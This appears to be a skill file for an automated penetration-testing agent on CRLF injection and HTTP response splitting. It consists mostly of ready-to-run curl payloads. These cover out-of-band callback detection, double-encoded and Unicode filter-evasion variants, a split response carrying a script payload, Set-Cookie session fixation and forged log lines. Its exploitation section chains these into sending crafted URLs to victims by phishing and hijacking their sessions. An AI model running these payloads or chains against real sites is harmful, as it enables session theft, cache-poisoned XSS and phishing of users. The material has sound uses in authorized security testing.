# CRLF Injection / HTTP Response Splitting — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Testing | **Impact:** High | **Prerequisite:** Endpoint mapped (Phase 2), parameters reflected in HTTP headers or redirect Location values identified

---

## Mental Model

CRLF injection happens when user input lands in an HTTP *header* (or header-derived value) without the CR (`\r`, 0x0D) and LF (`\n`, 0x0A) characters being stripped. Because headers are newline-delimited, an attacker who can inject `\r\n` can terminate the current header and start a new one.

**The core assumption you're violating:** "Header values are written by the server, so they can't contain newlines." Servers never sanitize what they themselves set — so if the server interpolates your input into a header, the newlines survive.

**The 4 impact classes:**
1. **Header Injection** — inject arbitrary response headers (Set-Cookie, Location, Refresh). Session fixation, redirect to phishing, cache poisoning.
2. **Response Splitting** — inject a complete second HTTP response (`\r\n\r\nHTTP/1.1 200 OK...`). The proxy/keep-alive treats it as a new response → your HTML body is served to the *next* victim request → persistent XSS.
3. **Cache Poisoning** — a poisoned response (with your body/headers) cached and served to all users.
4. **Log Injection** — CRLF in log file entries to forge log lines (lower impact, but reportable).

**Where CRLF lives:**
- Redirect / open-redirect parameters reflected into `Location:`
- Parameters reflected into `Set-Cookie`, `X-Forwarded-*`, `Referer`-echoed headers
- Custom headers the app echoes back (debug headers, request ID)
- `Host`/`Referer`/`Origin` echoed into headers or HTML `<meta http-equiv=refresh>`
- Download/filename parameters reflected in `Content-Disposition`

**The key tool:** `curl -i` (or Burp MCP `send_http1_request`) — you need to *see the raw response headers*, not a rendered page.

---

## Phase 1: OOB-First Detection (MANDATORY)

Blind CRLF injection is confirmed with OOB: inject a `Refresh` or `Location` header pointing at your OOB server — a victim browser (or the cache) following it hits your callback.

```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

```bash
# Inject a Refresh header that forces a browser to your OOB server
curl -i "https://target.com/redirect?url=https%3A%2F%2Ftarget.com%2Fnext%0d%0aRefresh%3A%200%3Burl%3Dhttp%3A%2F%2F$OOB_URL"
# Inject via Location override
curl -i "https://target.com/go?next=%0d%0aLocation%3A%20http%3A%2F%2F$OOB_URL%2Fhijack"
# Host header echo
curl -i -H "Host: target.com%0d%0aX-CRLF: 1" https://target.com/
```

```bash
./tools/interactsh_launcher.sh poll --output-dir engagement/oob/ --timeout 60
```

Callback → CRLF is reflected into a header the browser will follow. CONFIRMED. Skip to Phase 4.

---

## Phase 2: Confirmation

### 2.1 Injection Surface Discovery

First find *where* input is reflected into headers. Grep the Phase 2 mapping output for:
- `Location:` that includes a user-controlled redirect parameter
- Response headers echoing request headers (`X-Forwarded-For`, `Referer`, `Host`)
- Debug/`Server:`-adjacent custom headers
- `Content-Disposition` filename parameters

Test each candidate param with `curl -i` and a single encoding:

```bash
curl -i "https://target.com/redirect?url=/next%0d%0aX-Injected:%20true"
```

If `X-Injected: true` appears in the response headers → CRLF confirmed on this param.

### 2.2 Encoding Bypass (Filter Evasion)

If the plain `%0d%0a` is stripped, work through bypasses in order:

```bash
# Direct (URL-encoded)
url=%0d%0aX-Test:%201
url=%0A%0DX-Test:%201          # LF only (some parsers split on \n alone)

# Double encoding (WAF strips once, app decodes again)
url=%250d%250aX-Test:%201
url=%250d%250a%250d%250a

# Unicode / fullwidth (legacy IIS/.NET parsers)
url=%u000d%u000aX-Test:%201
url=%uff05%u000d%uff05%u000a

# Whitespace/newline variants (some proxies split on any line break)
url=%0d%0d%0aX-Test:%201
url=%0a%0dX-Test:%201
url=%09X-Test:%201             # bare tab rarely works; test anyway
```

### 2.3 Response Splitting (Persistent XSS via cache)

Inject a full second response and check that a subsequent request on the same connection returns your body:

```bash
PAYLOAD='%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%20NN%0d%0a%0d%0a<html><script>alert(document.domain)</script></html>'
curl -i "https://target.com/redirect?url=/next$PAYLOAD"
```

If the connection's next response is your injected body → full response splitting. Even without splitting, header injection alone is a reportable finding.

### 2.4 Session Fixation via Set-Cookie

```bash
curl -i "https://target.com/redirect?url=/next%0d%0aSet-Cookie:%20sessionid%3Dattacker%3B%20HttpOnly%3B%20Path%3D%2F"
```

If `Set-Cookie: sessionid=attacker` appears in the response → attacker can fixate any victim's session cookie.

### 2.5 Log Injection

Parameters echoed into server logs (search, error paths):

```bash
curl "https://target.com/search?q=%0d%0a[INFO]%20admin%20logged%20in"
```

Check with the app owner whether logs are viewable by internal staff — this is a low-severity but valid finding.

---

## Phase 3: Negative Verdict (MANDATORY GATE)

**DO NOT declare CRLF negative without:**

1. Testing **every** param that is reflected into *any* header (redirect, Set-Cookie, Content-Disposition, echoed request headers)
2. Testing all encoding variants from 2.2 (direct, LF-only, double, unicode, fullwidth) — filters are encoding-specific
3. Testing both URL-encoded and raw `\r\n` in POST bodies (some parsers only sanitize query strings)
4. Testing the **Host**, **Referer**, and **Origin** headers themselves if the app echoes them
5. Confirming via `curl -i` raw output that no injected header appears (NOT by status code alone)
6. If the app strips newlines → verify it strips **both** `%0d` AND `%0a` in every encoding

If nothing survives → NEGATIVE.

---

## Phase 4: Exploitation

### 4.1 Persistent XSS via Response Splitting (Primary Impact)
1. Confirm the app is behind a caching proxy (check response headers for `X-Cache`, `Age`)
2. Inject the split second response with an XSS payload
3. Issue a follow-up request — if your body is served to the next user → cache-poisoned XSS, high severity
4. Even without a cache, response splitting XSS fires on the same keep-alive connection

### 4.2 Session Fixation Chain
1. Inject `Set-Cookie: sessionid=ATTACKER`
2. Send the crafted URL to the victim (phishing)
3. When they log in, their authenticated session rides the fixated cookie ID → attacker steals it

### 4.3 Redirect-to-Phishing
Inject `Location: https://phishing.example.com` and send the URL to victims — the app's own domain makes the redirect look legitimate.

**Stop condition:** First confirmed persistent/reflected impact (XSS body or injected header) with evidence. Document and stop.

---

## What You DO
- Use `curl -i` / raw HTTP tools — you must see the headers, never judge by status code
- Find *every* header-reflection point from mapping before testing
- Work encoding bypasses in a defined order (direct → LF-only → double → unicode)
- Test response splitting whenever header injection works — it multiplies severity
- Test Set-Cookie injection separately (session fixation is its own bounty)

## What You DO NOT Do
- Rely on a browser to detect CRLF — browsers silently drop malformed headers; only raw tools show it
- Assume URL-decoding is the only decode layer — test double-encoding against WAFs
- Declare negative because one param survived — test all reflection points and all encodings
- Skip the cache check — response splitting without cache poisoning is still XSS, but the cache makes it persistent and critical

---

## Cross-Skill Links
- [[xss]] — Response splitting delivers a persistent XSS primitive
- [[cache-poisoning]] — CRLF header injection is a classic cache poisoning primitive
- [[session-management]] — Set-Cookie injection enables session fixation
- [[open-redirect]] — Redirect params are the most common CRLF reflection point
